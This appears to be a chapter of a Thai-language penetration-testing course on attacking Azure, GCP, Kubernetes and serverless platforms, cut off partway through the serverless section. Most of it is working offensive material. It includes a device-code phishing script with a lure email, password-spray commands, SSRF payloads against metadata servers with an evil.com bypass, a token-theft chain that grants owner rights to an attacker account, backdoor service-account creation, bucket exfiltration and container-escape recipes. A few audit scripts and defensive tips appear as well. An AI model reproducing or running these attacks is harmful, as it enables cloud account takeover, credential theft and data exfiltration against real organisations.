# Part 95: Advanced Cloud Attacks - Azure & GCP (Steps 941-950)

## ภาพรวม
การทดสอบความปลอดภัยบน Cloud Environment โดยเฉพาะ Azure และ GCP
ครอบคลุมการเข้าถึงโดยไม่ได้รับอนุญาต Identity attacks, Privilege escalation และ Lateral movement ใน Cloud

---

## Step 941: Azure Active Directory Attacks

```python
from dataclasses import dataclass
from typing import List, Dict

@dataclass
class AzureADAttacks:
    """เทคนิคการโจมตี Azure Active Directory"""
    
    AZURE_AD_ATTACK_PATHS = {
        "Initial Access": [
            "Password spray against Azure AD",
            "OAuth 2.0 device code phishing",
            "Adversary-in-the-middle (AiTM) phishing",
            "Leaked credentials from public sources",
            "Azure AD Connect exploitation"
        ],
        "Privilege Escalation": [
            "Entra ID role assignment abuse",
            "App registration with high permissions",
            "Service Principal exploitation",
            "Managed Identity abuse",
            "PIM (Privileged Identity Management) bypass"
        ],
        "Persistence": [
            "Backdoor app registration",
            "Add credentials to existing app",
            "Create new Global Admin",
            "Federated identity manipulation",
            "SSPR (Self-Service Password Reset) abuse"
        ]
    }
    
    # เครื่องมือสำหรับ Azure AD Pentesting
    TOOLS = {
        "ROADtools": "Azure AD reconnaissance and attack framework",
        "AADInternals": "PowerShell module for Azure AD / Office 365 attacks",
        "Stormspotter": "Azure Red Team tool for BloodHound-like visualization",
        "BloodHound (AzureHound)": "Azure AD attack path analysis",
        "PowerZure": "PowerShell framework for Azure exploitation",
        "MicroBurst": "Azure security assessment scripts"
    }
    
    DEVICE_CODE_PHISHING = '''
# Azure Device Code Phishing - MFA Bypass Technique
# Ref: MITRE ATT&CK T1528

import requests
import json
from time import sleep

class DeviceCodePhishing:
    """Device Code Flow Abuse for Initial Access"""
    
    # Azure Application IDs (public clients)
    TARGET_APPS = {
        "Microsoft Office": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "Microsoft Teams": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
        "Azure CLI": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
    }
    
    def initiate_device_code_flow(self, tenant_id: str, client_id: str) -> dict:
        """Start device code flow to get login URL"""
        url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/devicecode"
        data = {
            "client_id": client_id,
            "scope": "openid profile email https://graph.microsoft.com/.default offline_access"
        }
        response = requests.post(url, data=data)
        return response.json()
    
    def poll_for_token(self, tenant_id: str, client_id: str, device_code: str) -> dict:
        """Poll until user completes authentication"""
        url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
        data = {
            "client_id": client_id,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "device_code": device_code
        }
        
        while True:
            response = requests.post(url, data=data).json()
            if "access_token" in response:
                return response
            elif response.get("error") == "authorization_pending":
                sleep(5)  # Wait before polling again
            else:
                return response  # Error or expired
    
    def phishing_email_template(self, user_code: str) -> str:
        """Generate phishing email content"""
        return f"""
Subject: Action Required: Microsoft Account Verification

Dear User,

Your Microsoft account requires immediate verification.
Please complete the following steps within 15 minutes:

1. Visit: https://microsoft.com/devicelogin
2. Enter code: {user_code}
3. Click Confirm

This is required for continued access to company resources.

IT Security Team
"""

# การป้องกัน: ใช้ Conditional Access Policies และ MFA
'''
    
    AADTOOLS_COMMANDS = '''
# ROADtools - Azure AD Recon
# ติดตั้ง
# pip install roadtools roadrecon

# 1. Authenticate
roadrecon auth -u user@tenant.onmicrosoft.com -p Password123

# 2. Gather all Azure AD objects
roadrecon gather

# 3. Launch web interface for analysis
roadrecon gui
# Access: http://localhost:5000

# AADInternals - More advanced attacks
# Install: Install-Module AADInternals

# Enumerate tenant information
Get-AADIntLoginInformation -UserName user@company.com

# Password spray
Invoke-AADIntPasswordSpray -UserName user@company.com -Password Password123

# Get access token via device code
$token = Get-AADIntAccessToken -ClientId d3590ed6-52b3-4102-aeff-aad2292ab01c \\
    -Tenant company.onmicrosoft.com -SaveToCache

# Enumerate Global Admins
Get-AADIntGlobalAdmins
'''
    
    def generate_azure_recon_checklist(self) -> List[str]:
        """รายการเริ่มต้น Azure AD Recon"""
        return [
            "Identify tenant domain and ID",
            "Enumerate users (OSINT + brute force)",
            "Check MFA enforcement policies",
            "Enumerate App Registrations",
            "Check Service Principal permissions",
            "Identify Managed Identities",
            "Review Conditional Access Policies",
            "Check PIM role assignments",
            "Enumerate External Identities (B2B)",
            "Check Azure AD Connect sync settings"
        ]

if __name__ == "__main__":
    azure = AzureADAttacks()
    print("Azure AD Attack Paths:")
    for phase, attacks in azure.AZURE_AD_ATTACK_PATHS.items():
        print(f"\n  {phase}:")
        for attack in attacks:
            print(f"    - {attack}")
    
    print("\nAzure Pentest Tools:")
    for tool, desc in azure.TOOLS.items():
        print(f"  {tool}: {desc}")
    
    checklist = azure.generate_azure_recon_checklist()
    print(f"\nRecon Checklist ({len(checklist)} items)")
```

---

## Step 942: Azure RBAC และ Privilege Escalation

```python
from dataclasses import dataclass
from typing import List, Dict

class AzurePrivilegeEscalation:
    """เทคนิค Privilege Escalation บน Azure"""
    
    DANGEROUS_PERMISSIONS = {
        "Microsoft.Authorization/roleAssignments/write": "Can assign any RBAC role to any principal",
        "Microsoft.Authorization/roleDefinitions/write": "Can create custom roles with any permissions",
        "Microsoft.Authorization/policyAssignments/write": "Can create policy assignments",
        "Microsoft.Compute/virtualMachines/extensions/write": "Can execute code on VMs via extensions",
        "Microsoft.ManagedIdentity/userAssignedIdentities/assign/action": "Can assign managed identity",
        "Microsoft.Resources/deployments/write": "Can deploy ARM templates",
        "Microsoft.KeyVault/vaults/secrets/read": "Can read Key Vault secrets",
        "Microsoft.Storage/storageAccounts/listKeys/action": "Can get storage account keys",
        "Microsoft.Automation/automationAccounts/jobs/write": "Can create runbook jobs",
        "Microsoft.Web/sites/functions/write": "Can modify Azure Functions"
    }
    
    PRIVESC_TECHNIQUES = {
        "User Access Administrator": {
            "method": "Role Assignment Write",
            "description": "User can assign Owner role to themselves",
            "command": "az role assignment create --role Owner --assignee <your-object-id> --scope /"
        },
        "VM Extension Execution": {
            "method": "Compute VM extension write",
            "description": "Execute code on VM via Custom Script Extension",
            "command": "az vm extension set --resource-group RG --vm-name VM --name customScript --publisher Microsoft.Azure.Extensions --settings '{\"commandToExecute\": \"id && whoami > /tmp/privesc\"}'"
        },
        "ARM Template Deployment": {
            "method": "Resources deployments write",
            "description": "Deploy ARM template to create backdoor resources",
            "command": "az deployment group create --resource-group RG --template-file backdoor.json"
        },
        "Automation Account Runbook": {
            "method": "Automation jobs write",
            "description": "Run PowerShell as Automation Account managed identity",
            "command": "az automation job create --automation-account-name AA --runbook-name RB --resource-group RG"
        },
        "Function App Modification": {
            "method": "Function write permission",
            "description": "Modify Azure Function code for code execution",
            "command": "az functionapp deployment source config-zip --src malicious.zip"
        }
    }
    
    AZUREHOUND_QUERIES = '''
# AzureHound - Azure AD BloodHound
# ติดตั้งและใช้งาน

# 1. Install AzureHound
go install github.com/BloodHoundAD/AzureHound@latest

# 2. Authenticate and collect data
azurehound login -u user@tenant.com
azurehound list --all --tenant TENANT_ID --output azurehound-data.json

# 3. Import to BloodHound
# Upload azurehound-data.json to BloodHound GUI

# Useful Cypher Queries:
# Find Paths to Global Admin
MATCH p = shortestPath(
  (n {objecttype:"User"})-[:*1..]->(m {objecttype:"AZRole"})
) WHERE m.displayname = "Global Administrator"
RETURN p

# Find over-privileged service principals
MATCH (n:AZServicePrincipal)-[:AZOwns]->(m)
RETURN n.displayname, count(m) as owned
ORDER BY owned DESC

# Find VMs with managed identity
MATCH (n:AZVM)-[:AZManagedIdentity]->(m:AZServicePrincipal)
RETURN n.name, m.displayname
'''
    
    def check_dangerous_permissions(self, permissions: List[str]) -> List[Dict]:
        """ตรวจสอบว่ามี dangerous permissions หรือไม่"""
        findings = []
        for perm in permissions:
            if perm in self.DANGEROUS_PERMISSIONS:
                findings.append({
                    "permission": perm,
                    "risk": self.DANGEROUS_PERMISSIONS[perm],
                    "privesc_technique": next(
                        (k for k, v in self.PRIVESC_TECHNIQUES.items()
                         if perm in v.get("method", "")), None
                    )
                })
        return findings

if __name__ == "__main__":
    azure_privesc = AzurePrivilegeEscalation()
    
    print("Azure Dangerous Permissions:")
    for perm, risk in list(azure_privesc.DANGEROUS_PERMISSIONS.items())[:5]:
        print(f"  {perm[:50]}: {risk[:50]}")
    
    print("\nPrivilege Escalation Techniques:")
    for technique, info in azure_privesc.PRIVESC_TECHNIQUES.items():
        print(f"  {technique}: {info['description']}")
```

---

## Step 943: Azure Storage และ Key Vault Attacks

```python
from dataclasses import dataclass
from typing import List, Dict

class AzureStorageAttacks:
    """การโจมตี Azure Storage และ Key Vault"""
    
    STORAGE_ATTACK_VECTORS = {
        "Public Blob Container": {
            "description": "Unauthenticated access to public blobs",
            "impact": "Data exposure",
            "tool": "BlobHunter, microburst",
            "test_command": "az storage container list --account-name ACCT --auth-mode login"
        },
        "Shared Access Signature": {
            "description": "Weak or leaked SAS tokens allow unauthorized access",
            "impact": "Data access and manipulation",
            "tool": "Az CLI, Azure Storage Explorer",
            "test_command": "az storage blob list --container-name CONTAINER --sas-token TOKEN"
        },
        "Storage Account Keys": {
            "description": "If listKeys permission exists, full access to all storage",
            "impact": "Complete storage account compromise",
            "tool": "Az CLI",
            "test_command": "az storage account keys list --account-name ACCT --resource-group RG"
        },
        "Diagnostic Logs": {
            "description": "Sensitive data stored in diagnostic log storage accounts",
            "impact": "Credential and audit log exposure"
        }
    }
    
    KEY_VAULT_ATTACKS = {
        "Secret Enumeration": {
            "command": "az keyvault secret list --vault-name VAULT_NAME",
            "impact": "Expose all stored secrets"
        },
        "Secret Extraction": {
            "command": "az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME",
            "impact": "Extract plaintext secret value"
        },
        "Certificate Export": {
            "command": "az keyvault certificate export --vault-name VAULT_NAME --name CERT_NAME --file cert.pem",
            "impact": "Export certificates with private keys"
        },
        "Key Export": {
            "command": "az keyvault key download --vault-name VAULT_NAME --name KEY_NAME --file key.json",
            "impact": "Export encryption keys"
        }
    }
    
    BLOB_HUNTING_SCRIPT = '''
# BlobHunter - Find Public Azure Blobs
# github.com/cyberark/BlobHunter

python blobhunter.py -c SUBSCRIPTION_ID

# Manual Azure CLI Enumeration
# Find all storage accounts with public access enabled
az storage account list --query "[?allowBlobPublicAccess==true].name" -o table

# Check specific container public access level
az storage container show \\
    --name CONTAINER_NAME \\
    --account-name STORAGE_ACCOUNT \\
    --query publicAccess

# Download all blobs from public container
azcopy copy \\
    "https://ACCOUNT.blob.core.windows.net/CONTAINER/" \\
    "./downloaded/" \\
    --recursive
'''
    
    MICROBURST_COMMANDS = '''
# MicroBurst - Azure Security Assessment
# Install: Install-Module MicroBurst

# Find open Azure blob storage
Invoke-EnumerateAzureBlobs -Base COMPANY_NAME

# Get storage account keys
Get-AzStorageKey -Subscription SUBSCRIPTION_ID

# Find sensitive data in storage
Get-AzStorageContent -SasTokens $tokens

# Extract Key Vault secrets
Get-AzKeyVaultContents -Subscription SUBSCRIPTION_ID

# Find overprivileged Service Principals
Get-AzServicePrincipalObjects -Subscription SUBSCRIPTION_ID
'''
    
    def generate_storage_audit_script(self) -> str:
        """Script สำหรับ Azure Storage Security Audit"""
        return '''
#!/bin/bash
# Azure Storage Security Audit Script

SUBSCRIPTION=$(az account show --query id -o tsv)
echo "[*] Auditing subscription: $SUBSCRIPTION"

echo "\n[*] Checking for public storage accounts..."
az storage account list \\
    --query "[?allowBlobPublicAccess].{name:name, rg:resourceGroup}" \\
    -o table

echo "\n[*] Checking storage accounts without HTTPS..."
az storage account list \\
    --query "[?!enableHttpsTrafficOnly].{name:name, rg:resourceGroup}" \\
    -o table

echo "\n[*] Checking Key Vaults with public access..."
az keyvault list \\
    --query "[?properties.networkAcls.defaultAction==\'Allow\'].name" \\
    -o table

echo "\n[*] Listing Key Vault secrets (requires permissions)..."
for vault in $(az keyvault list --query "[].name" -o tsv); do
    echo "Key Vault: $vault"
    az keyvault secret list --vault-name $vault \\
        --query "[].{name:name, expires:attributes.expires}" \\
        -o table 2>/dev/null
done
'''

if __name__ == "__main__":
    storage = AzureStorageAttacks()
    print("Azure Storage Attack Vectors:")
    for vector, info in storage.STORAGE_ATTACK_VECTORS.items():
        print(f"  {vector}: {info['description']}")
    
    print("\nKey Vault Attacks:")
    for attack, info in storage.KEY_VAULT_ATTACKS.items():
        print(f"  {attack}: {info['impact']}")
```

---

## Step 944: GCP Identity และ IAM Attacks

```python
from dataclasses import dataclass
from typing import List, Dict

class GCPIAMAttacks:
    """การโจมตี GCP Identity and Access Management"""
    
    DANGEROUS_GCP_PERMISSIONS = {
        "iam.serviceAccounts.actAs": "Impersonate service accounts - leads to privilege escalation",
        "iam.serviceAccountKeys.create": "Create SA keys for persistent access",
        "iam.roles.update": "Modify IAM roles to add permissions",
        "resourcemanager.projects.setIamPolicy": "Modify project-level IAM policy",
        "storage.buckets.setIamPolicy": "Control bucket access",
        "compute.instances.setMetadata": "Modify VM metadata (SSH keys)",
        "cloudfunctions.functions.update": "Modify Cloud Function code",
        "container.clusters.update": "Modify GKE cluster configuration",
        "secretmanager.secrets.get": "Read secret values",
        "cloudkms.cryptoKeyVersions.useToDecrypt": "Decrypt KMS-encrypted data"
    }
    
    PRIVESC_PATHS = {
        "ActAs Service Account": {
            "permission": "iam.serviceAccounts.actAs",
            "technique": "Impersonate high-privilege SA",
            "command": "gcloud projects get-iam-policy PROJECT_ID"
        },
        "Create Service Account Key": {
            "permission": "iam.serviceAccountKeys.create",
            "technique": "Create persistent key for backdoor SA",
            "command": "gcloud iam service-accounts keys create key.json --iam-account SA@PROJECT.iam.gserviceaccount.com"
        },
        "GCE Metadata Server": {
            "permission": "compute.instances.setMetadata",
            "technique": "Set SSH authorized keys or startup script",
            "command": "gcloud compute instances add-metadata INSTANCE --metadata ssh-keys='attacker:SSH_KEY'"
        },
        "Set IAM Policy": {
            "permission": "resourcemanager.projects.setIamPolicy",
            "technique": "Grant Owner to controlled account",
            "command": "gcloud projects add-iam-policy-binding PROJECT_ID --member=user:attacker@gmail.com --role=roles/owner"
        }
    }
    
    GCP_RECON_COMMANDS = '''
# GCP Enumeration Commands

# List all projects
gcloud projects list

# Enumerate IAM bindings
gcloud projects get-iam-policy PROJECT_ID

# List service accounts
gcloud iam service-accounts list --project PROJECT_ID

# List SA keys
gcloud iam service-accounts keys list \\
    --iam-account SA@PROJECT.iam.gserviceaccount.com

# Enumerate Cloud Storage buckets
gsutil ls -p PROJECT_ID

# Check bucket permissions
gsutil iam get gs://BUCKET_NAME

# List Compute Engine instances
gcloud compute instances list

# Get instance metadata (from within GCE)
curl -H "Metadata-Flavor: Google" \\
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# List GKE clusters
gcloud container clusters list

# List Cloud Functions
gcloud functions list

# List Cloud Run services
gcloud run services list

# Secret Manager enumeration
gcloud secrets list
gcloud secrets versions access latest --secret SECRET_NAME
'''
    
    GCLOUD_PRIVILEGE_ESCALATION = '''
# GCP Privilege Escalation via actAs

# Find service accounts with high permissions
gcloud iam service-accounts list

# Check permissions for a SA
gcloud iam service-accounts get-iam-policy SA@PROJECT.iam.gserviceaccount.com

# Generate access token as SA (requires actAs permission)
gcloud auth print-access-token --impersonate-service-account=SA@PROJECT.iam.gserviceaccount.com

# Via metadata server (from GCE VM)
curl -H "Metadata-Flavor: Google" \\
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Use stolen token
curl -H "Authorization: Bearer ACCESS_TOKEN" \\
    https://cloudresourcemanager.googleapis.com/v1/projects
'''
    
    def enumerate_gcp_attack_surface(self) -> List[str]:
        """รายการจุด attack surface ใน GCP"""
        return [
            "Public Cloud Storage buckets",
            "Publicly accessible GCE instances",
            "GKE clusters with public API server",
            "Cloud Functions with unauthenticated access",
            "Cloud Run services with public access",
            "Exposed GCP metadata server",
            "Overprivileged service accounts",
            "Service account key files in storage",
            "Firebase Realtime Database with open access",
            "BigQuery datasets with public access"
        ]

if __name__ == "__main__":
    gcp = GCPIAMAttacks()
    print("Dangerous GCP Permissions:")
    for perm, desc in list(gcp.DANGEROUS_GCP_PERMISSIONS.items())[:5]:
        print(f"  {perm}: {desc[:60]}")
    
    print("\nGCP Privilege Escalation Paths:")
    for path, info in gcp.PRIVESC_PATHS.items():
        print(f"  {path}: {info['technique']}")
    
    attack_surface = gcp.enumerate_gcp_attack_surface()
    print(f"\nAttack Surface ({len(attack_surface)} items)")
```

---

## Step 945: GCP Metadata Server และ SSRF Attacks

```python
from dataclasses import dataclass
from typing import List, Dict

class GCPMetadataAttacks:
    """การโจมตีผ่าน GCP Metadata Server"""
    
    METADATA_ENDPOINTS = {
        "Service Account Token": {
            "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "description": "Get OAuth2 access token for the instance's SA",
            "impact": "Access GCP APIs as the instance's service account"
        },
        "Service Account Email": {
            "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
            "description": "Get service account email",
            "impact": "Identify the SA for further enumeration"
        },
        "Project ID": {
            "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "description": "Get GCP project ID",
            "impact": "Enumerate project resources"
        },
        "SSH Public Keys": {
            "url": "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
            "description": "List all SSH keys configured at project level",
            "impact": "Enumerate authorized users"
        },
        "Custom Metadata": {
            "url": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "description": "List custom metadata keys",
            "impact": "Expose credentials stored in metadata"
        },
        "Startup Script": {
            "url": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script",
            "description": "Get startup script",
            "impact": "Expose credentials/secrets in startup scripts"
        }
    }
    
    SSRF_PAYLOADS_GCP = [
        # Direct access
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        # Bypass attempts
        "http://metadata.google.internal@evil.com/computeMetadata/v1/",
        "http://[::ffff:169.254.169.254]/computeMetadata/v1/",
        "http://0251.0376.0251.0376/computeMetadata/v1/"  # Octal
    ]
    
    SSRF_TO_GCP_TAKEOVER = '''
# SSRF ใน GCP - Step by Step

# Step 1: SSRF เพื่อดึง token
curl -s "https://vuln-app.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \\
    -H "Metadata-Flavor: Google"

# Response:
# {"access_token":"ya29.xxx","expires_in":3599,"token_type":"Bearer"}

# Step 2: ใช้ token เก็บข้อมูล project
export TOKEN="ya29.xxx"
curl -H "Authorization: Bearer $TOKEN" \\
    https://cloudresourcemanager.googleapis.com/v1/projects

# Step 3: เข้าถึง Storage buckets
curl -H "Authorization: Bearer $TOKEN" \\
    https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID

# Step 4: อ่านสิทธิ์ IAM
curl -H "Authorization: Bearer $TOKEN" \\
    https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:getIamPolicy

# Step 5: ถ้ามีสิทธิ์ เพิ่ม backdoor
curl -X POST -H "Authorization: Bearer $TOKEN" \\
    -H "Content-Type: application/json" \\
    -d \'{\'policy\': {\'bindings\': [{\'role\': \'roles/owner\', \'members\': [\'user:attacker@gmail.com\']}]}}\'  \\
    https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:setIamPolicy
'''
    
    METADATA_DEFENSE = [
        "Enable Shielded VMs with vTPM",
        "Use Workload Identity Federation instead of SA keys",
        "Implement organization policy to restrict SA key creation",
        "Enable audit logging for metadata server access",
        "Use metadata server v1beta1 with metadata concealment",
        "Block SSRF with proper URL validation in applications",
        "Use Cloud Armor WAF rules to detect SSRF patterns",
        "Implement VPC Service Controls"
    ]
    
    def generate_metadata_test_script(self) -> str:
        """Script ทดสอบการเข้าถึง metadata server"""
        return '''
#!/bin/bash
# Test GCP Metadata Server Access

METADATA_URL="http://metadata.google.internal/computeMetadata/v1"

test_endpoint() {
    URL="$METADATA_URL/$1"
    echo -n "Testing: $1 ... "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \\
        -H "Metadata-Flavor: Google" "$URL")
    if [ "$STATUS" == "200" ]; then
        echo "ACCESSIBLE"
        curl -s -H "Metadata-Flavor: Google" "$URL"
    else
        echo "NOT ACCESSIBLE (HTTP $STATUS)"
    fi
    echo
}

test_endpoint "instance/service-accounts/default/token"
test_endpoint "instance/service-accounts/default/email"
test_endpoint "project/project-id"
test_endpoint "instance/attributes/"
test_endpoint "project/attributes/ssh-keys"
'''

if __name__ == "__main__":
    gcp_meta = GCPMetadataAttacks()
    print("GCP Metadata Server Endpoints:")
    for endpoint, info in gcp_meta.METADATA_ENDPOINTS.items():
        print(f"  {endpoint}: {info['impact']}")
    
    print(f"\nSSRF Payloads: {len(gcp_meta.SSRF_PAYLOADS_GCP)}")
    print("\nDefense Recommendations:")
    for defense in gcp_meta.METADATA_DEFENSE[:5]:
        print(f"  - {defense}")
```

---

## Step 946: Cloud Lateral Movement

```python
from dataclasses import dataclass
from typing import List, Dict

class CloudLateralMovement:
    """เทคนิค Lateral Movement บน Cloud"""
    
    AZURE_LATERAL_MOVEMENT = {
        "Azure AD Token Lateral Movement": {
            "technique": "Use acquired Azure AD tokens to access other services",
            "services": ["Exchange Online", "SharePoint", "Teams", "Azure DevOps"],
            "tool": "TokenTactics, AADInternals"
        },
        "VM-to-VM via Managed Identity": {
            "technique": "Use VM managed identity to access Azure resources then pivot to other VMs",
            "tool": "Az CLI",
            "command": "az vm list --subscription SUBSCRIPTION_ID"
        },
        "Azure DevOps Pipeline": {
            "technique": "Exploit DevOps pipelines to execute code in multiple environments",
            "technique_detail": "Modify pipeline YAML to execute commands in other stages"
        },
        "App Service Environment": {
            "technique": "Web apps often have access to other internal resources",
            "technique_detail": "SSRF to hit internal APIs from App Service"
        }
    }
    
    GCP_LATERAL_MOVEMENT = {
        "Service Account Chain": {
            "technique": "Compromise SA A -> Use SA A to impersonate SA B with higher privileges",
            "command": "gcloud auth activate-service-account --key-file=sa_a.json"
        },
        "GKE Pod to Node Escape": {
            "technique": "Escape from GKE pod to underlying node",
            "steps": [
                "Get node SA token from pod metadata",
                "Use token to list nodes and pods",
                "Schedule privileged pod to access host"
            ]
        },
        "Cloud SQL Proxy": {
            "technique": "If SA has cloudsql.instances.connect, access databases laterally",
            "command": "./cloud-sql-proxy PROJECT_ID:REGION:INSTANCE_NAME"
        },
        "Pub/Sub Message Injection": {
            "technique": "Inject malicious messages into Pub/Sub topics to affect subscribers",
            "impact": "Affects all services subscribed to that topic"
        }
    }
    
    CLOUD_ATTACK_PATH_EXAMPLE = '''
# Example Cloud Attack Path: GCP Initial Access to Takeover

Step 1: Initial Access
  - Found public GCS bucket with service account key
  gcloud auth activate-service-account --key-file=leaked-key.json

Step 2: Enumeration
  gcloud projects list
  gcloud iam service-accounts list
  gcloud projects get-iam-policy PROJECT_ID

Step 3: Find escalation path
  - SA has iam.serviceAccounts.actAs permission
  gcloud iam service-accounts list  # Find admin SA

Step 4: Impersonate high-privilege SA
  gcloud auth print-access-token \\
    --impersonate-service-account=admin-sa@PROJECT.iam.gserviceaccount.com

Step 5: Create backdoor with new SA
  gcloud iam service-accounts create backdoor --project PROJECT_ID
  gcloud projects add-iam-policy-binding PROJECT_ID \\
    --member="serviceAccount:backdoor@PROJECT.iam.gserviceaccount.com" \\
    --role="roles/owner"
  gcloud iam service-accounts keys create backdoor-key.json \\
    --iam-account=backdoor@PROJECT.iam.gserviceaccount.com

Step 6: Exfiltrate data from Cloud Storage
  gsutil -m cp -r gs://sensitive-bucket/* ./exfil/
'''
    
    def map_cloud_attack_path(self, cloud_provider: str) -> List[str]:
        """แสดงเส้นทางการโจมตีบน cloud"""
        if cloud_provider == "azure":
            return [
                "Initial Access: Password spray or phishing",
                "Foothold: Azure AD user account",
                "Enumeration: Azure AD users, groups, apps",
                "Lateral Movement: Azure AD token abuse",
                "Privilege Escalation: RBAC role abuse",
                "Persistence: Backdoor app registration",
                "Exfiltration: Access Storage/Key Vault"
            ]
        elif cloud_provider == "gcp":
            return [
                "Initial Access: Leaked SA key or phishing",
                "Foothold: Service account authentication",
                "Enumeration: Projects, resources, IAM",
                "Lateral Movement: SA impersonation",
                "Privilege Escalation: actAs high-privilege SA",
                "Persistence: New SA key creation",
                "Exfiltration: GCS, Secret Manager, databases"
            ]
        return []

if __name__ == "__main__":
    cloud_lm = CloudLateralMovement()
    
    print("Azure Lateral Movement Techniques:")
    for tech, info in cloud_lm.AZURE_LATERAL_MOVEMENT.items():
        print(f"  {tech}: {info['technique']}")
    
    print("\nGCP Attack Path:")
    for step in cloud_lm.map_cloud_attack_path("gcp"):
        print(f"  - {step}")
```

---

## Step 947: Container และ Kubernetes Cloud Attacks

```python
from dataclasses import dataclass
from typing import List, Dict

class ContainerCloudAttacks:
    """การโจมตี Container และ Kubernetes บน Cloud"""
    
    K8S_ATTACK_TECHNIQUES = {
        "Unauthenticated API Server": {
            "description": "k8s API server accessible without auth",
            "impact": "Full cluster compromise",
            "test": "curl -k https://K8S_API:6443/api/v1/pods"
        },
        "RBAC Privilege Escalation": {
            "description": "Pods with create-pods or bind-clusterrole permissions",
            "technique": "Create privileged pod to escape to node",
            "test": "kubectl auth can-i create pods --all-namespaces"
        },
        "Privileged Container Escape": {
            "description": "Containers running with --privileged flag",
            "technique": "Mount host filesystem and escape"
        },
        "Service Account Token Abuse": {
            "description": "Pods automount service account tokens",
            "technique": "Use SA token to access k8s API",
            "token_location": "/var/run/secrets/kubernetes.io/serviceaccount/token"
        },
        "Etcd Access": {
            "description": "Direct access to etcd gives all secrets",
            "impact": "Extract all Kubernetes secrets",
            "command": "etcdctl get /registry/secrets --prefix"
        }
    }
    
    CONTAINER_ESCAPE_TECHNIQUES = {
        "Privileged Container": '''
# หนีโดยใช้ host namespace
pod_yaml: |
  apiVersion: v1
  kind: Pod
  spec:
    containers:
    - name: escape
      image: alpine
      securityContext:
        privileged: true  # <-- dangerous
      volumeMounts:
      - mountPath: /host
        name: host
    volumes:
    - name: host
      hostPath:
        path: /
    
# After pod runs:
kubectl exec -it escape -- chroot /host /bin/bash
''',
        "nsenter Escape": '''
# ใช้ nsenter เข้าสู่ host namespace
# ต้องการ pid namespace access
nsenter --mount=/proc/1/ns/mnt -- /bin/bash

# Or with hostPID:
pod_yaml: |
  spec:
    hostPID: true
    containers:
    - name: escape
      image: alpine
      command: ["nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/bash"]
      securityContext:
        privileged: true
''',
        "Docker Socket Mount": '''
# If docker.sock is mounted in container
ls /var/run/docker.sock

# Create privileged container via Docker socket
docker -H unix:///var/run/docker.sock run \\
    -it --privileged \\
    --pid=host \\
    -v /:/host \\
    ubuntu chroot /host bash
'''
    }
    
    KUBE_HUNTER_USAGE = '''
# kube-hunter - Kubernetes Penetration Testing
# Install: pip install kube-hunter

# Scan from outside the cluster
kube-hunter --remote K8S_API_SERVER_IP

# Scan from inside a pod
kube-hunter --pod

# Active hunting mode (attempts exploitation)
kube-hunter --active --remote K8S_API_SERVER_IP

# List all found issues
kube-hunter --list

# peirates - k8s penetration toolkit
# github.com/inguardians/peirates
./peirates
# Interactive menu for k8s attacks
'''
    
    def generate_k8s_audit_commands(self) -> str:
        """Commands สำหรับ Kubernetes Security Audit"""
        return '''
# Kubernetes Security Audit Commands

# Check for privileged pods
kubectl get pods --all-namespaces -o jsonpath="{.items[*].spec.containers[*].securityContext.privileged}" | tr ' ' '\\n' | grep true

# Find pods with hostPID/hostNetwork
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.hostPID==true or .spec.hostNetwork==true) | .metadata.name'

# Check RBAC for dangerous permissions
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# Find pods that can create pods (potential privesc)
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].verbs[] == "create" and .rules[].resources[] == "pods") | .metadata.name'

# Check for exposed secrets in env vars
kubectl get pods --all-namespaces -o json | jq '.items[].spec.containers[].env[]? | select(.value | tostring | test("(?i)(key|secret|pass|token|cred)"))'

# Check network policies
kubectl get networkpolicies --all-namespaces

# Check pod security admission
kubectl get namespaces -o json | jq '.items[] | {name: .metadata.name, enforcement: .metadata.labels["pod-security.kubernetes.io/enforce"]}'
'''

if __name__ == "__main__":
    container = ContainerCloudAttacks()
    print("Kubernetes Attack Techniques:")
    for tech, info in container.K8S_ATTACK_TECHNIQUES.items():
        print(f"  {tech}: {info['description']}")
    
    print("\nContainer Escape Techniques:")
    for escape, code in container.CONTAINER_ESCAPE_TECHNIQUES.items():
        print(f"  {escape}")
```

---

## Step 948: Serverless และ PaaS Attacks

```python
from dataclasses import dataclass
from typing import List, Dict

class ServerlessAttacks:
    """การโจมตี Serverless และ PaaS Services"""
    
    LAMBDA_ATTACK_VECTORS = {
        "Function URL Abuse": {
            "description": "Unauthenticated Lambda Function URL access",
            "test": "curl https://RANDOM.lambda-url.REGION.on.aws/",
            "impact": "Execute function without credentials"
        },
        "Event Injection": {
            "description": "Inject malicious data through event sources (S3, SQS, SNS)",
            "example": "SSTI in Lambda that processes SQS messages",
            "impact": "Code execution within Lambda"
        },
        "Environment Variable Exposure": {
            "description": "Lambda env vars often contain secrets",
            "test": "aws lambda get-function-configuration --function-name FUNC | jq .Environment",
            "impact": "Credential exposure"
        },
        "SSRF via Lambda": {
            "description": "Lambda with SSRF can access EC2 metadata",
            "target": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "impact": "Steal Lambda execution role credentials"
        },
        "Lambda Backdoor": {
            "description": "Modify Lambda function code for persistence",
